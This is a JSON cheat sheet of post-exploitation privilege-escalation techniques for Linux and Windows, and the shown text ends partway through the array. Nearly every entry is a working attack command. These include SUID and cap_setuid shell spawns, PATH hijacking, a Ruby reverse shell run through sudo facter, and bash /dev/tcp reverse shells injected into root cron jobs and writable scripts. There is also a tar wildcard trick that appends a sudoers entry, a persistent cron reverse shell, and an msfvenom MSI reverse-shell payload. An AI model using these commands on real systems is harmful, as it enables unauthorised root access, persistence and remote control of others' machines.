[
    {
        "category": "Linux",
        "technique": "Initial Enumeration",
        "description": "First things to check after getting a shell",
        "steps": [
            {
                "step": 1,
                "note": "Who am I / what groups",
                "command": "id && whoami"
            },
            {
                "step": 2,
                "note": "Users with real shell (potential targets)",
                "command": "getent passwd | grep -v nologin | grep -v false"
            },
            {
                "step": 3,
                "note": "Sudo rights — any NOPASSWD?",
                "command": "sudo -l"
            },
            {
                "step": 4,
                "note": "OS version / kernel",
                "command": "uname -a && cat /etc/os-release"
            },
            {
                "step": 5,
                "note": "Running processes (look for root processes)",
                "command": "ps aux | grep root"
            },
            {
                "step": 6,
                "note": "Network connections / listening ports",
                "command": "ss -tlnp"
            }
        ]
    },
    {
        "category": "Linux",
        "technique": "SUID Binary Abuse",
        "description": "SUID binaries run as owner (often root) — check gtfobins.github.io",
        "steps": [
            {
                "step": 1,
                "note": "Find all SUID binaries",
                "command": "find / -perm -u=s -type f 2>/dev/null"
            },
            {
                "step": 2,
                "note": "Check gtfobins for the binary found, then exploit",
                "command": "# e.g. find . -exec /bin/sh -p \\; -quit"
            },
            {
                "step": 3,
                "note": "PATH hijack — if binary calls another binary without full path",
                "command": "cd /tmp && echo '/bin/sh' > <binary_name> && chmod 777 <binary_name> && export PATH=/tmp:$PATH"
            },
            {
                "step": 4,
                "note": "Run the vulnerable SUID binary",
                "command": "/usr/bin/<binary>"
            }
        ]
    },
    {
        "category": "Linux",
        "technique": "Sudo NOPASSWD Abuse",
        "description": "If sudo -l shows NOPASSWD — check gtfobins for that binary",
        "steps": [
            {
                "step": 1,
                "note": "Check sudo permissions",
                "command": "sudo -l"
            },
            {
                "step": 2,
                "note": "Ruby reverse shell (e.g. facter --custom-dir)",
                "command": "echo 'exit if fork;c=TCPSocket.new(\"<lhost>\",<lport>);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end' > /tmp/shell.rb"
            },
            {
                "step": 3,
                "note": "Run with custom dir pointing to shell.rb",
                "command": "sudo /usr/bin/facter --custom-dir=/tmp/ x"
            },
            {
                "step": 4,
                "note": "Simple shell via script (alternative)",
                "command": "echo 'exec \"/bin/sh\"' > /tmp/shell.rb && sudo /usr/bin/facter --custom-dir=/tmp/ x"
            }
        ]
    },
    {
        "category": "Linux",
        "technique": "Capabilities Abuse",
        "description": "Capabilities like cap_setuid+ep on interpreters = root without SUID",
        "steps": [
            {
                "step": 1,
                "note": "Find binaries with capabilities set",
                "command": "getcap -r / 2>/dev/null"
            },
            {
                "step": 2,
                "note": "Exploit cap_setuid on python3 (adjust binary path)",
                "command": "/usr/bin/python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'"
            },
            {
                "step": 3,
                "note": "Exploit cap_setuid on perl",
                "command": "perl -e 'use POSIX (setuid); POSIX::setuid(0); exec \"/bin/bash\";'"
            }
        ]
    },
    {
        "category": "Linux",
        "technique": "Cron Job Abuse",
        "description": "Scripts run by root cron that are writable = instant privesc",
        "steps": [
            {
                "step": 1,
                "note": "Check cron jobs",
                "command": "cat /etc/crontab && ls -la /etc/cron*"
            },
            {
                "step": 2,
                "note": "Check user crontabs",
                "command": "crontab -l"
            },
            {
                "step": 3,
                "note": "Find writable scripts being run as root",
                "command": "find / -writable -type f 2>/dev/null | grep -v proc"
            },
            {
                "step": 4,
                "note": "Inject reverse shell into writable cron script",
                "command": "echo 'bash -i >& /dev/tcp/<lhost>/<lport> 0>&1' >> /path/to/script.sh"
            }
        ]
    },
    {
        "category": "Linux",
        "technique": "Cron Wildcard (tar)",
        "description": "tar with wildcard * in cron — inject checkpoint flags as filenames",
        "steps": [
            {
                "step": 1,
                "note": "Confirm cron uses tar with wildcard",
                "command": "cat /etc/crontab | grep tar"
            },
            {
                "step": 2,
                "note": "Create shell script to add sudoer",
                "command": "echo '#!/bin/bash\\necho \"<user> ALL=(ALL:ALL) ALL\" >> /etc/sudoers' > /path/to/shell.sh && chmod +x /path/to/shell.sh"
            },
            {
                "step": 3,
                "note": "Create checkpoint flag files (tar reads these as flags)",
                "command": "echo '' > '--checkpoint-action=exec=sh shell.sh' && echo '' > --checkpoint=1"
            },
            {
                "step": 4,
                "note": "Wait for cron to run, then sudo",
                "command": "sudo -l && sudo -s"
            }
        ]
    },
    {
        "category": "Linux",
        "technique": "Writable File / Script",
        "description": "Root-owned writable files — inject code or replace script",
        "steps": [
            {
                "step": 1,
                "note": "Find root-owned writable files",
                "command": "find / -writable -user root -type f 2>/dev/null | grep -v proc"
            },
            {
                "step": 2,
                "note": "Find files writable by current user",
                "command": "find / -writable -type f 2>/dev/null | grep -v proc"
            },
            {
                "step": 3,
                "note": "Inject reverse shell into writable script",
                "command": "echo 'bash -i >& /dev/tcp/<lhost>/<lport> 0>&1' >> /path/to/writable.sh"
            }
        ]
    },
    {
        "category": "Linux",
        "technique": "Persistence (Cron)",
        "description": "Add cron reverse shell for persistent access after root",
        "steps": [
            {
                "step": 1,
                "note": "Add cron reverse shell every minute",
                "command": "( crontab -l 2>/dev/null; echo '* * * * * bash -i >& /dev/tcp/<lhost>/<lport> 0>&1') | crontab -"
            },
            {
                "step": 2,
                "note": "Start listener",
                "command": "nc -lvnp <lport>"
            }
        ]
    },
    {
        "category": "Windows",
        "technique": "Initial Enumeration",
        "description": "First things to check after getting a shell",
        "steps": [
            {
                "step": 1,
                "note": "Who am I / privileges",
                "command": "whoami && whoami /priv && whoami /groups"
            },
            {
                "step": 2,
                "note": "OS info",
                "command": "systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" /C:\"System Type\""
            },
            {
                "step": 3,
                "note": "Check installed applications",
                "command": "Get-ItemProperty \"HKLM:\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*\" | select displayname"
            },
            {
                "step": 4,
                "note": "Search sensitive files in user dirs",
                "command": "Get-ChildItem -Path C:\\Users\\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue"
            },
            {
                "step": 5,
                "note": "Search config files (e.g. XAMPP)",
                "command": "Get-ChildItem -Path C:\\xampp\\ -Include *.ini,*.conf,*.config -File -Recurse -ErrorAction SilentlyContinue"
            },
            {
                "step": 6,
                "note": "Command history",
                "command": "Get-History"
            }
        ]
    },
    {
        "category": "Windows",
        "technique": "AlwaysInstallElevated",
        "description": "If both registry keys = 1, any user can install MSI as SYSTEM",
        "steps": [
            {
                "step": 1,
                "note": "Check HKLM key (must be 1)",
                "command": "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated"
            },
            {
                "step": 2,
                "note": "Check HKCU key (must be 1)",
                "command": "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated"
            },
            {
                "step": 3,
                "note": "Generate malicious MSI payload (on attacker)",
                "command": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f msi -o installer.msi"
            },
            {
                "step": 4,
                "note": "Install MSI (runs as SYSTEM)",
                "command": "msiexec /quiet /qn /i installer.msi"
            }
        ]
    },
